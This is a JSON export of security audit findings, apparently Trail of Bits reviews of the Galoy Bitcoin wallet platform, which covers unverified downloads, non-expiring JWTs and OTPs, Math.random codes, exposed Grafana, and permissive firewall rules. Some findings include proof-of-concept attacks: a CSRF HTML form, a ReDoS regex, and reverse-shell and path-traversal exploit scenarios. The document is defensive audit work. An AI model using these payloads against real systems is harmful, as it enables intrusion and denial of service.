        "body": "The create_full_client function contains code that uses hard-coded strings to indicate conguration paths (gure 9.1) in place of the previously dened DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE values, which are used in the other parts of the code. This is a risky coding pattern, as a Subspace developer who is updating the DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE values may forget to also update the equivalent values used in the create_full_client function. if primary_chain_node.client.info().best_number == 33670 { if let Some (config_dir) = config_dir { let workaround_file = config_dir.join( \"network\" ).join( \"gemini_1b_workaround\" ); if !workaround_file.exists() { let _ = std::fs::write(workaround_file, &[]); let _ = std::fs::remove_file( config_dir.join( \"network\" ).join( \"secret_ed25519\" ) ); return Err (anyhow!( \"Applied workaround for upgrade from gemini-1b-2022-jun-08, \\ please restart this node\" )); } } } Figure 9.1: subspace-desktop/src-tauri/src/node.rs#L207-L219 Recommendations Short term, update the code in gure 9.1 to use DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE rather than the hard-coded values. This will make eventual updates to these paths less error prone.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Insecure download process for the yq tool ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Dockerle uses the Wget utility to download the yq tool but does not verify the le it has downloaded by its checksum or signature. Without verication, an archive that has been corrupted or modied by a malicious third party may not be detected. Figures 1.1 and 1.2 show cases in which a tool is downloaded without verication of its checksum. 6 RUN wget https://github.com/mikefarah/yq /releases/download/v4.17.2/yq_linux_386.tar.gz -O - | \\ 7 tar xz && mv yq_linux_386 /usr/bin/yq Figure 1.1: The Dockerle downloads and unarchives the yq tool. ( ci/image/Dockerfile#67 ) 41 wget https://github.com/bodymindarts/cepler /releases/download/v ${ cepler_version } /cepler-x 86_64-unknown-linux-musl- ${ cepler_version } .tar.gz \\ 42 && tar -zxvf cepler-x86_64-unknown-linux-musl- ${ cepler_version } .tar.gz \\ 43 && mv cepler-x86_64-unknown-linux-musl- ${ cepler_version } /cepler /usr/local/bin \\ 44 && chmod +x /usr/local/bin/cepler \\ 45 && rm -rf ./cepler-* Figure 1.2: The bastion-startup script downloads and unarchives the cepler tool. ( modules/inception/gcp/bastion-startup.tmpl#4145 ) Exploit Scenario An attacker gains access to the GitHub repository from which yq is downloaded. The attacker then modies the binary to create a reverse shell upon yq s startup. When a user runs the Dockerle, the attacker gains access to the users container. Recommendations Short term, have the Dockerle and other scripts in the solution verify each le they download by its checksum . Long term, implement checks to ensure the integrity of all third-party components used in the solution and periodically check that all components are downloaded from encrypted URLs.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Use of unencrypted HTTP scheme ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy ipfetcher module uses the unencrypted HTTP scheme (gure 2.1). As a result, an attacker in the same network as the host invoking the code in gure 2.1 could intercept and modify both the request and ipfetcher s response to it, potentially accessing sensitive information. 8 9 const { data } = await axios.get( ` http ://proxycheck.io/v2/ ${ ip } ?key= ${ PROXY_CHECK_APIKEY } &vpn=1&asn=1` , 10 ) Figure 2.1: src/services/ipfetcher/index.ts#810 Exploit Scenario Eve gains access to Alices network and obtains Alices PROXY_CHECK_APIKEY by observing the unencrypted network trac. Recommendations Short term, change the URL scheme used in the ipfetcher service to HTTPS. Long term, use tools such as WebStorm code inspections to nd other uses of unencrypted URLs.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of expiration and revocation mechanism for JWTs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy system uses JSON web tokens (JWTs) for authentication. A user obtains a new JWT by calling the userLogin GraphQL mutation. Once a token has been signed, it is valid forever; the platform does not set an expiration time for tokens and cannot revoke them. 7 export const createToken = ({ 8 uid, 9 network, 10 }: { 11 uid: UserId 12 network: BtcNetwork 13 }): JwtToken => { 14 return jwt.sign({ uid, network }, JWT_SECRET, { // (...) 25 algorithm: \"HS256\" , 26 }) as JwtToken 27 } Figure 3.1: The creation of a JWT ( src/services/jwt.ts#727 ) Exploit Scenario An attacker obtains a users JWT and gains persistent access to the system. The attacker then engages in destructive behavior. The victim eventually notices the behavior but does not have a way to stop it. Recommendations Short term, consider setting an expiration time for JWTs, and implement a mechanism for revoking tokens. That way, if a JWT is leaked, an attacker will not gain persistent access to the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Use of insecure function to generate phone codes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy application generates a verication code by using the JavaScript function Math.random() , which is not a cryptographically secure pseudorandom number generator (CSPRNG) . const randomIntFromInterval = (min, max) => Math .floor( Math .random() * (max - min + 1 ) + min) 10 11 12 // (...) 82 83 84 85 86 87 const code = String ( randomIntFromInterval( 100000 , 999999 ) ) as PhoneCode const galoyInstanceName = getGaloyInstanceName() const body = ` ${ code } is your verification code for ${ galoyInstanceName } ` const result = await PhoneCodesRepository().persistNew({ 88 phone: phoneNumberValid , 89 code, 90 }) 91 92 93 94 95 96 } if (result instanceof Error ) return result const sendTextArguments = { body, to: phoneNumberValid , logger } return TwilioClient().sendText(sendTextArguments) Figure 4.1: src/app/users/request-phone-code.ts#1096 Exploit Scenario An attacker repeatedly generates verication codes and analyzes the values and the order of their generation. The attacker attempts to deduce the pseudorandom number generator's internal state. If successful, the attacker can then perform an oine calculation to predict future verication codes. Recommendations Short term, replace Math.random() with a CSPRNG. Long term, always use a CSPRNG to generate random values for cryptographic operations.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Redundant basic authentication method ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy application implements a basic authentication method (gure 5.1) that is redundant because the apiKey is not being used. Superuous authentication methods create new attack vectors and should be removed from the codebase. 1 2 3 import express from \"express\" const formatError = new Error ( \"Format is Authorization: Basic <base64(key:secret)>\" ) 4 5 export default async function ( 6 req: express.Request , 7 _res: express.Response , 8 next: express.NextFunction , 9 ) { 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 const authorization = req.headers[ \"authorization\" ] if (!authorization) return next() const parts = authorization.split( \" \" ) if (parts.length !== 2 ) return next() const scheme = parts[ 0 ] if (! /Basic/i .test(scheme)) return next() const credentials = Buffer. from (parts[ 1 ], \"base64\" ).toString().split( \":\" ) if (credentials.length !== 2 ) return next(formatError) const [apiKey, apiSecret] = credentials if (!apiKey || !apiSecret) return next(formatError) 25 req[ \"apiKey\" ] = apiKey 26 req[ \"apiSecret\" ] = apiSecret 27 next() 28 } Figure 5.1: The basic authentication method implementation ( src/servers/middlewares/api-key-auth.ts#128 ) Recommendations Short term, remove the apiKey -related code. Long term, review and clearly document the Galoy authentication methods.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. GraphQL queries may facilitate CSRF attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy applications /graphql endpoint handles queries sent via GET requests. It is impossible to pass state-changing mutations or subscriptions in GET requests, and authorized queries need the Authorization: Bearer header. However, if a state-changing GraphQL operation were mislabeled as a query (typically a non-state-changing request), the endpoint would be vulnerable to cross-site request forgery (CSRF) attacks. Exploit Scenario An attacker creates a malicious website with JavaScript code that sends requests to the /graphql endpoint (gure 6.1). When a user visits the website, the JavaScript code is executed in the users browser, changing the servers state. <html> <body> <script> history.pushState('', '', '/') </script> <form action= \"http://192.168.236.135:4002/graphql\" > <input type= \"hidden\" name= \"query\" value= \"query&#32;&#123;&#10;&#9;btcPriceList&#40;range&#58;ONE&#95;MONTH&#41;&#32;&# 123;&#10;&#9;&#9;price&#32;&#123;&#10;&#9;&#9;&#9;offset&#10;&#9;&#9;&#125;&#10;&#9; &#9;timestamp&#10;&#9;&#125;&#10;&#125;\" /> <input type= \"submit\" value= \"Submit request\" /> </form> </body> </html> Figure 6.1: In this proof-of-concept CSRF attack, the malicious website sends a request (the btcPriceList query) when the victim clicks Submit request. Recommendations Short term, disallow the use of the GET method to send queries, or enhance the CSRF protections for GET requests. Long term, identify all state-changing endpoints and ensure that they are protected by an authentication or anti-CSRF mechanism. Then implement tests for those endpoints. References   Cross-Origin Resource Sharing, Mozilla documentation Cross-Site Request Forgery Prevention, OWASP Cheat Sheet Series",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Potential ReDoS risk ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The caseInsensitiveRegex function takes an input: string parameter and uses it to create a new RegExp object (gure 7.1). Users cannot currently control the input parameter (the regular expression) or the string; however, if users gain that ability as the code is developed, it may enable them to cause a regular expression denial of service (ReDoS) . 13 14 export const caseInsensitiveRegex = (input: string ) => { return new RegExp ( `^ ${ input } $` , \"i\" ) 15 } Figure 7.1: src/services/mongoose/users.ts#1315 37 const findByUsername = async ( 38 username: Username , 39 ): Promise<Account | RepositoryError> => { 40 41 try { const result = await User.findOne( 42 { username: caseInsensitiveRegex (username) }, Figure 7.2: src/services/mongoose/accounts.ts#3742 Exploit Scenario An attacker registers an account with a specially crafted username (line 2, gure 7.3), which forms part of a regex. The attacker then nds a way to pass the malicious regex (line 1, gure 7.3) to the findByUsername function, causing a denial of service on a victims machine. 1 2 let test = caseInsensitiveRegex( \"(.*){1,32000}[bc]\" ) let s = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\" 3 s.match(test) Figure 7.3: A proof of concept for the ReDoS vulnerability Recommendations Short term, ensure that input passed to the caseInsensitiveRegex function is properly validated and sanitized.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Use of MD5 to generate unique GeeTest identiers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy application uses MD5 hashing to generate a unique identier during GeeTest service registration. MD5 is an insecure hash function and should never be used in a security-relevant context. 33 const register = async (): Promise<UnknownCaptchaError | GeetestRegister> => { 34 35 36 37 try { const gtLib = new GeetestLib(config.id, config.key) const digestmod = \"md5\" const params = { 38 digestmod, 39 client_type: \"native\" , 40 } 41 42 43 const bypasscache = await getBypassStatus() // not a cache let result if (bypasscache === \"success\" ) { 44 result = await gtLib.register(digestmod, params) Figure 8.1: src/services/geetest.ts#3344 Recommendations Short term, change the hash function used in the register function to a stronger algorithm that will not cause collisions, such as SHA-256. Long term, document all cryptographic algorithms used in the system, implement a policy governing their use, and create a plan for when and how to deprecate them.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Reliance on SMS-based OTPs for authentication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Galoys authentication process is heavily reliant on the delivery of one-time passwords (OTPs) over SMS. This authentication method contravenes best practices and should not be used in applications that handle nancial transactions or other sensitive operations. SMS-based OTP leaves users vulnerable to multiple attacks and is considered an unsafe authentication method. Several of the most common and eective attack scenarios are described below.    Text messages received by a mobile device can be intercepted by rogue applications on the device. Many users blindly authorize untrusted third-party applications to access their mobile phones SMS databases; this means that a vulnerability in a third-party application could lead to the compromise and disclosure of the text messages on the device, including Galoys SMS OTP messages. Another common technique used to target mobile nance applications is the interception of notications on a device. Android operating systems, for instance, broadcast notications across applications by design; a rogue application could subscribe to those notications to access incoming text message notications. Attackers also target SMS-based two-factor authentication and OTP implementations through SIM swapping . In short, an attacker uses social engineering to gather information about the owner of a SIM card and then, impersonating its owner, requests a new SIM card from the telecom company. All calls and text messages will then be sent to the attacker, leaving the original owner of the number out of the loop. This approach has been used in many recent attacks against crypto wallet owners, leading to millions of dollars in losses. Recommendations Short term, avoid using SMS authentication as anything other than an optional way to validate an account holder's identity and prole information. Instead of SMS-based OTP, provide support for hardware-based two-factor authentication methods such as Yubikey tokens, or software-based time-based one-time password (TOTP) implementations such as Google Authenticator and Authy. References  What is a Sim Swap? Denition and Related FAQs, Yubico",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Incorrect handling and implementation of SMS OTPs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Users authenticate to the web panel by providing OTPs sent to them over SMS. We identied two issues in the OTP authentication implementation: 1. The generated OTPs are persistent because OTP expiration dates are calculated incorrectly. The Date.now() method returns the epoch time in milliseconds, whereas it is meant to return the time in seconds. 294 const PhoneCodeSchema = new Schema({ 295 created_at: { 296 297 type : Date , default: Date.now , 298 required: true , Figure 10.1: The default date value is expressed in milliseconds. ( src/services/mongoose/schema.ts#294298 ) 11 export const VALIDITY_TIME_CODE = ( 20 * 60 ) as Seconds Figure 10.2: The default validity period is expressed in seconds. ( src/config/index.ts#11 ) 49 50 51 const age = VALIDITY_TIME_CODE const validCode = await isCodeValid({ phone: phoneNumberValid , code, age }) if (validCode instanceof Error ) return validCode Figure 10.3: Validation of an OTPs age ( src/app/users/login.ts#4951 ) 18 }): Promise < true | RepositoryError> => { 19 20 21 const timestamp = Date .now() / 1000 - age try { const phoneCode = await PhoneCode.findOne({ 22 phone, 23 code, 24 created_at: { 25 $gte: timestamp , 26 }, Figure 10.4: The codebase validates the timestamp in seconds, while the default date is in milliseconds, as shown in gure 10.1. ( src/services/mongoose/phone-code.ts#1826 ) 2. The SMS OTPs are never discarded. When a new OTP is sent to a user, the old one remains valid regardless of its expiration time. A users existing OTP tokens also remain valid if the user manually logs out of a session, which should not be the case. Tests of the admin-panel and web-wallet code conrmed that all SMS OTPs generated for a given phone number remain valid in these cases. Exploit Scenario After executing a successful phishing attack against a user, an attacker is able to intercept an OTP sent to that user, gaining persistent access to the victim's account. The attacker will be able to use the code even when the victim logs out of the session or requests a new OTP. Recommendations Short term, limit the lifetime of OTPs to two minutes. Additionally, immediately invalidate an OTP, even an unexpired one, when any of the following events occur:      The user logs out of a session The user requests a new OTP The OTP is used successfully The OTP reaches its expiration time The users account is locked for any reason (e.g., too many login attempts) References  NIST best practices for implementing authentication tokens",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Vulnerable and outdated Node packages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "We used the yarn audit and snyk tools to audit the project dependencies and components for known vulnerabilities and outdated versions, respectively. The project uses many outdated packages with known security vulnerabilities ranging from critical to low severity. A list of vulnerable and outdated packages is included in appendix C . Vulnerabilities in packages imported by an application are not necessarily exploitable. In most cases, an aected method in a vulnerable package needs to be used in the right context to be exploitable. We manually reviewed the packages with high- or critical-severity vulnerabilities and did not nd any vulnerabilities that could be exploited in the Galoy application. However, that could change as the code is further developed. Exploit Scenario An attacker ngerprints one of Galoys components, identies an out-of-date package with a known vulnerability, and uses it in an exploit against the component. Recommendations Short term, update the outdated and vulnerable dependencies. Long term, integrate static analysis tools that can detect outdated and vulnerable libraries (such as the yarn audit and snyk tools) into the build and / or test pipeline. This will improve the system's security posture and help prevent the exploitation of project dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Outdated and internet-exposed Grafana instance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Grafana admin panel is exposed over the internet. A management interface should not be exposed over the internet unless it is protected by a secondary authentication or access control mechanism; these mechanisms (e.g., IP address restrictions and VPN solutions) can mitigate the immediate risk to an application if it experiences a vulnerability. Moreover, the Grafana version deployed at grafana.freecorn.galoy.io is outdated and vulnerable to known security issues. Figure 12.1: The outdated Grafana version (8.2.1) with known security issues The version banner on the login page (gure 12.1) identies the version as v8.2.1 ( 88622d7f09 ). This version has multiple moderate- and high-risk vulnerabilities. One of them, a path traversal vulnerability ( CVE-2021-43798 ), could enable an unauthenticated attacker to read the contents of arbitrary les on the server. However, we could not exploit this issue, and the Galoy team suggested that the code might have been patched through an upstream software deployment. Time constraints prevented us from reviewing all Grafana instances for potential vulnerabilities. We reviewed only the grafana.freecorn.galoy.io instance, but the recommendations in this nding apply to all deployed instances. Exploit Scenario An attacker identies the name of a valid plugin installed and active on the instance. By using a specially crafted URL, the attacker can read the contents of any le on the server (as long as the Grafana process has permission to access the le). This enables the attacker to read sensitive conguration les and to engage in remote command execution on the server. Recommendations Short term, avoid exposing any Grafana instance over the internet, and restrict access to each instances management interface. This will make the remote exploitation of any issues much more challenging. Long term, to avoid known security issues, review all deployed instances and ensure that they have been updated to the latest version. Additionally, review the Grafana log les for any indication of the attack described in CVE-2021-43798, which has been exploited in the wild. References  List of publicly known vulnerabilities aecting recent versions of Grafana",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Incorrect processing of GET path parameter ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "If the value of the hidden path parameter in the GET request in gure 13.1 does not match the value in the appRoutesDef array, the request will cause an unhandled error (gure 13.2). The error occurs when the result of the serverRenderer function is undefined (line 21, gure 13.3), because the Invalid route path error is thrown in the call to the renderToStringWithData function (gure 13.4). GET / ?path=aaaa HTTP / 1.1 Host: localhost:3000 Figure 13.1: The HTTP request that triggers the error HTTP / 1.1 500 Internal Server Error // (...) ReferenceError: /Users/md/work/web-wallet/views/index.ejs:8 6| <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /> 7| >> 8| <title><%- pageData.title %></title> 9| 10| <link rel=\"stylesheet\" href=\"/themes/<%- GwwConfig.walletTheme -%>/colors.css\" /> 11| <link rel=\"stylesheet\" href=\"/bundles/<%- gVars['main'][0] -%>\" /> pageData is not defined at eval (\"web-wallet/views/index.ejs\":12:17) at index (web-wallet/node_modules/ejs/lib/ejs.js:692:17) at tryHandleCache (web-wallet/node_modules/ejs/lib/ejs.js:272:36) at View.exports.renderFile [as engine] (web-wallet/node_modules/ejs/lib/ejs.js:489:10) at View.render (web-wallet/node_modules/express/lib/view.js:135:8) at tryRender (web-wallet/node_modules/express/lib/application.js:640:10) at Function.render (web-wallet/node_modules/express/lib/application.js:592:3) at ServerResponse.render (web-wallet/node_modules/express/lib/response.js:1017:7) at web-wallet/src/server/ssr-router.ts:24:18 </ pre ></ body ></ html > Figure 13.2: The HTTP response that shows the unhandled error 21 22 23 24 const vars = await serverRenderer(req)({ // undefined path: checkedRoutePath , }) return res.render( \"index\" , vars) // call when the vars is undefined Figure 13.3: src/server/ssr-router.ts#2124 10 export const serverRenderer = 11 (req: Request ) => 12 async ({ 13 path, 14 flowData, 15 }: { 16 path: RoutePath | AuthRoutePath 17 flowData?: KratosFlowData 18 }) => { 19 try { // (...) 43 const initialMarkup = await renderToStringWithData(App) // (...) 79 }) 80 } catch (err) { 81 console.error(err) 82 } Figure 13.4: src/renderers/server.tsx#1082 Exploit Scenario An attacker nds a way to inject malicious code into the hidden path parameter. This results in an open redirect vulnerability, enabling the attacker to redirect a victim to a malicious website. Recommendations Short term, ensure that errors caused by an invalid path parameter value (one not included in the appRoutesDef whitelist) are handled correctly. A path parameter should not be processed if it is unused. Long term, use Burp Suite Professional with the Param Miner extension to scan the application for hidden parameters.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. Discrepancies in API and GUI access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Although the Web Wallets graphical user interface (GUI) does not allow changes to a username (gure 14.1), they can be made through the GraphQL userUpdateUsername mutation (gure 14.2). Figure 14.1: The lock icon on the Settings page indicates that it is not possible to change a username. POST /graphql HTTP / 2 Host: api.freecorn.galoy.io Content-Length: 345 Content-Type: application/json Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI2MjI3ODYwMWJlOGViYWYxZWRmNDBhNDYiLCJ uZXR3b3JrIjoibWFpbm5ldCIsImlhdCI6MTY0Njc1NzU4NX0.ed2dk9gMQh5DJXCPpitj5wq78n0gFnmulRp 2KIXTVX0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Origin: https://wallet.freecorn.galoy.io { \"operationName\" : \"userUpdateUsername\" , \"variables\" :{ \"input\" :{ \"username\" : \"aaaaaaaaaaaa aaa\" }}, \"query\" : \" mutation userUpdateUsername($input: UserUpdateUsernameInput!) {\\n userUpdateUsername(input: $input) {\\n errors {\\n message\\n __typename\\n }\\n user {\\n id\\n username\\n __typename\\n }\\n __typename\\n }\\n} \" } HTTP/ 2 200 OK // (...) { \"data\" :{ \"userUpdateUsername\" :{ \"errors\" :[], \"user\" :{ \"id\" : \"04f01fb4-6328-5982-a39a-eeb 027a2ceef\" , \"username\" : \"aaaaaaaaaaaaaaa\" , \"__typename\" : \"User\" }, \"__typename\" : \"UserUpdat eUsernamePayload\" }}} Figure 14.2: The HTTP request-response cycle that enables username changes Exploit Scenario An attacker nds a discrepancy in the access controls of the GUI and API and is then able to use a sensitive method that the attacker should not be able to access. Recommendations Short term, avoid relying on client-side access controls. If the business logic of a functionality needs to be blocked, the block should be enforced in the server-side code. Long term, create an access control matrix for specic roles in the application and implement unit tests to ensure that appropriate access controls are enforced server-side.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Cloud SQL does not require TLS connections ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Terraforms declarative conguration le for the Cloud SQL instance does not indicate that PostgreSQL should enforce the use of Transport Layer Security (TLS) connections. Similarly, the Galoy solution does not use the Cloud SQL Auth proxy, which provides strong encryption and authentication using identity and access management. Because the database is exposed only in a virtual private cloud (VPC) network, this nding is of low severity. Exploit Scenario An attacker manages to eavesdrop on trac in the VPC network. If one of the database clients is miscongured, the attacker will be able to observe the database trac in plaintext. Recommendations Short term, congure Cloud SQL to require the use of TLS, or use the Cloud SQL Auth proxy. Long term, integrate Terrascan or another automated analysis tool into the workow to detect areas of improvement in the solution. References   Congure SSL/TLS certicates , Cloud SQL documentation Connect from Google Kubernetes Engine , Cloud SQL documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Kubernetes node pools are not congured to auto-upgrade ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The Galoy application uses Google Kubernetes Engine (GKE) node pools in which the auto-upgrade functionality is disabled. The auto-upgrade functionality helps keep the nodes in a Kubernetes cluster up to date with the Kubernetes version running on the cluster control plane, which Google updates on the users behalf. Auto-upgrades also ensure that security updates are timely applied. Disabling this setting is not recommended by Google and could create a security risk if patching is not performed manually. 124 125 126 management { auto_repair = true auto_upgrade = false 127 } Figure 16.1: The auto-upgrade property is set to false . ( modules/platform/gcp/kube.tf#124127 ) Recommendations Short term, enable the auto-upgrade functionality to ensure that the nodes are kept up to date and that security patches are timely applied. Long term, remain up to date on the security features oered by Google Cloud. Integrate Terrascan or another automated tool into the development workow to detect areas of improvement in the solution. References  Auto-upgrading nodes , GKE documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Overly permissive rewall rules ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The VPC rewall conguration is overly permissive. This conguration, in conjunction with Google Clouds default VPC rules, allows most communication between pods (gure 17.2), the bastion host (gure 17.3), and the public internet (gure 17.1). 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 resource \"google_compute_firewall\" \"bastion_allow_all_inbound\" { project = local.project name = \"${local.name_prefix}-bastion-allow-ingress\" network = google_compute_network.vpc.self_link target_tags = [ local.tag ] direction = \"INGRESS\" source_ranges = [ \"0.0.0.0/0\" ] priority = \"1000\" allow { protocol = \"all\" } 107 } Figure 17.1: The bastion ingress rules allow incoming trac on all protocols and ports from all addresses. ( modules/inception/gcp/bastion.tf#92107 ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 resource \"google_compute_firewall\" \"intra_egress\" { project = local.project name = \"${local.name_prefix}-intra-cluster-egress\" description = \"Allow pods to communicate with each other and the master\" network = data.google_compute_network.vpc.self_link priority = 1000 direction = \"EGRESS\" target_tags = [ local.cluster_name ] destination_ranges = [ local.master_ipv4_cidr_block , google_compute_subnetwork.cluster.ip_cidr_range , google_compute_subnetwork.cluster.secondary_ip_range[0].ip_cidr_range , ] # Allow all possible protocols allow { protocol = \"tcp\" } allow { protocol = \"udp\" } allow { protocol = \"icmp\" } allow { protocol = \"sctp\" } allow { protocol = \"esp\" } allow { protocol = \"ah\" } 23 } Figure 17.2: Pods can initiate connections to other pods on all protocols and ports. ( modules/platform/gcp/firewall.tf#123 ) 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 resource \"google_compute_firewall\" \"dmz_nodes_ingress\" { name = \"${var.name_prefix}-bastion-nodes-ingress\" description = \"Allow ${var.name_prefix}-bastion to reach nodes\" project = local.project network = data.google_compute_network.vpc.self_link priority = 1000 direction = \"INGRESS\" target_tags = [ local.cluster_name ] source_ranges = [ data.google_compute_subnetwork.dmz.ip_cidr_range , ] # Allow all possible protocols allow { protocol = \"tcp\" } allow { protocol = \"udp\" } allow { protocol = \"icmp\" } allow { protocol = \"sctp\" } allow { protocol = \"esp\" } 63 allow { protocol = \"ah\" } 64 } Figure 17.3: The bastion host can initiate connections to pods on all protocols and ports. ( modules/platform/gcp/firewall.tf#4464 ) Exploit Scenario 1 An attacker gains access to a pod through a vulnerability in an application. He takes advantage of the unrestricted egress trac and miscongured pods to launch attacks against other services and pods in the network. Exploit Scenario 2 An attacker discovers a vulnerability on the Secure Shell server running on the bastion host. She exploits the vulnerability to gain network access to the Kubernetes cluster, which she can then use in additional attacks. Recommendations Short term, restrict both egress and ingress trac to necessary protocols and ports. Document the expected network interactions across the components and check them against the implemented rewall rules. Long term, use services such as the Identity-Aware Proxy to avoid exposing hosts directly to the internet, and enable VPC Flow Logs for network monitoring. Additionally, integrate automated analysis tools such as tfsec into the development workow to detect rewall issues early on. References  Using IAP for TCP forwarding, Identity-Aware Proxy documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Lack of uniform bucket-level access in Terraform state bucket ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Uniform bucket-level access is not enabled in the bootstrap module bucket used to store the Terraform state. When enabled, this feature implements a uniform permission system, providing access at the bucket level rather than on a per-object basis. It also simplies the access controls / permissions of a bucket, making them easier to manage and reason about. 1 2 3 4 5 6 7 8 resource \"google_storage_bucket\" \"tf_state\" { name = \"${local.name_prefix}-tf-state\" project = local.project location = local.tf_state_bucket_location versioning { enabled = true } force_destroy = local.tf_state_bucket_force_destroy 9 } Figure 18.1: The bucket denition lacks a uniform_bucket_level_access eld set to true . ( modules/bootstrap/gcp/tf-state-bucket.tf#19 ) Exploit Scenario The permissions of some objects in a bucket are miscongured. An attacker takes advantage of that fact to access the Terraform state. Recommendations Short term, enable uniform bucket-level access in this bucket. Long term, integrate automated analysis tools such as tfsec into the development workow to identify any similar issues and areas of improvement.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Insecure storage of passwords ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Galoy passwords are stored in conguration les and environment variables or passed in as command-line arguments. There are two issues with this method of storage: (1) the default keys are low entropy (gure 19.1) and (2) the fact that there are default keys in the rst place suggests that users deploying components may not realize that they need to set passwords. 53 export BITCOINDRPCPASS=rpcpassword // (...) 68 export MONGODB_PASSWORD=password // (...) 79 export JWT_SECRET= \"jwt_secret\" Figure 19.1: An example conguration le with passwords ( .envrc#5379 ) Passing in sensitive values through environment variables (gure 19.2) increases the risk of a leak for several reasons:    Environment variables are often dumped to external services through crash-logging mechanisms. All processes started by a user can read environment variables from the /proc/$pid/environ le. Attackers often use this ability to dump sensitive values passed in through environment variables (though this requires nding an arbitrary le read vulnerability in the application). An application can also overwrite the contents of a special /proc/$pid/environ le. However, overwriting the le is not as simple as calling setenv(SECRET, \"******\") , because runtimes copy environment variables upon initialization and then operate on the copy. To clear environment variables from that special environ le, one must either overwrite the stack data in which they are located or make a low-level prctl system call with the PR_SET_MM_ENV_START and PR_SET_MM_ENV_END ags enabled to change the memory address of the content the le is rendered from. 12 const jwtSecret = process.env.JWT_SECRET Figure 19.2: src/config/process.ts#12 Certain initialization commands take a password as a command-line argument (gures 19.3 and 19.4). If an attacker gained access to a user account on a system running the script, the attacker would also gain access to any password passed as a command-line argument. 65 66 command : [ '/bin/sh' ] args : 67 - '-c' 68 - | 69 70 71 72 73 if [ ! -f /root/.lnd/data/chain/bitcoin/${NETWORK}/admin.macaroon ]; then while ! test -f /root/.lnd/tls.cert; do sleep 1; done apk update; apk add expect /home/alpine/walletInit.exp ${NETWORK} $LND_PASS fi Figure 19.3: charts/lnd/templates/statefulset.yaml#6573 55 set PASSWORD [lindex $argv 1]; Figure 19.4: 